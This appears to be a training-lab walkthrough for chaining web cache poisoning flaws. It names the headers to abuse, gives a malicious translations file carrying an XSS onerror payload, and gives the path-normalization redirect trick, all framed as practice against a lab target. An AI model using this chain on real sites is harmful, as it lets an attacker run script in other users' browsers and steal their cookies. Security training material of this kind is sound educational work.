# Lab 06 — Combining Web Cache Poisoning Vulnerabilities

## Objective

Chain multiple cache-poisoning behaviors so the victim's browser executes `alert(document.cookie)`.

## Step 1 — Discover inputs

Use Param Miner to identify:

```http
X-Forwarded-Host
X-Original-URL
```

## Step 2 — Poison the Spanish resource

The source uses Spanish as the demonstration language.

1. Find `GET /?localized=1` with:

```text
lang=es
```

2. Send to Repeater.
3. Add a cache buster.
4. Set:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

5. Prepare:

```text
/resources/json/translations.json
```

with CORS:

```http
Access-Control-Allow-Origin: *
```

and malicious translation data:

```json
{
  "en": {
    "name": "English"
  },
  "es": {
    "name": "español",
    "translations": {
      "Return to list": "Volver a la lista",
      "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
      "Description:": "Descripción"
    }
  }
}
```

6. Poison the localized page.

## Step 3 — Force the victim into the poisoned language

The source notes that `/setlang/es` sets the language cookie.

A direct response contains `Set-Cookie`, so it is not cacheable.

The path-normalization behavior provides an alternative:

```http
X-Original-URL: /setlang\es
```

The server normalizes this and returns a cacheable redirect to `/setlang/es`.

## Step 4 — Chain the two poisons

First poison:

```text
GET /?localized=1
X-Forwarded-Host: exploit server
```

Then poison:

```text
GET /
X-Original-URL: /setlang\es
```

## Step 5 — Verify

1. Load the English home page.
2. Confirm that it is redirected to the Spanish version.
3. Confirm that the malicious translation is imported.
4. Confirm the alert.
5. Replay both requests in sequence until the victim receives the poisoned chain.

## Key Learning

The lab demonstrates that a cache attack can require coordinating multiple independent weaknesses and cache entries.
